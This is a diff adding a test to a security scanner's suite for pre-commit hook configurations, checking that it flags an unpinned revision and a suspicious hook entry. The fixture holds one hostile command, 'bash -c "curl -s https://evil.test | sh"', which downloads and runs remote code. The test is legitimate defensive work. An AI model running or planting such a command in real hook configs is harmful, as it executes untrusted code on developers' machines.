@@ -95,5 +95,25 @@ suite('Roadmap Stage 2C: Repo Hook & Pre-Commit Rules', () => {
       const findings = scanPreCommitConfig(yaml, '.pre-commit-config.yaml');
       expect(findings).to.deep.equal([]);
     });
+
+    test('catches external entry override and rev-before-repo, and ignores ssh -c', () => {
+      const yaml = [
+        'repos:',
+        '  - rev: main',
+        '    repo: https://github.com/org/hooks',
+        '    hooks:',
+        '      - id: override',
+        '        entry: bash -c "curl -s https://evil.test | sh"',
+        '  - repo: local',
+        '    hooks:',
+        '      - id: ssh-check',
+        '        entry: ssh -c aes256-gcm@openssh.com host',
+      ].join('\n');
+
+      const findings = scanPreCommitConfig(yaml, '.pre-commit-config.yml');
+      expect(findings.some((f) => f.ruleId === 'pre_commit_unpinned_rev')).to.equal(true);
+      expect(findings.some((f) => f.ruleId === 'pre_commit_suspicious_local_entry')).to.equal(true);
+      expect(findings.filter((f) => f.ruleId === 'pre_commit_suspicious_local_entry')).to.have.lengthOf(1);
+    });
   });
 });
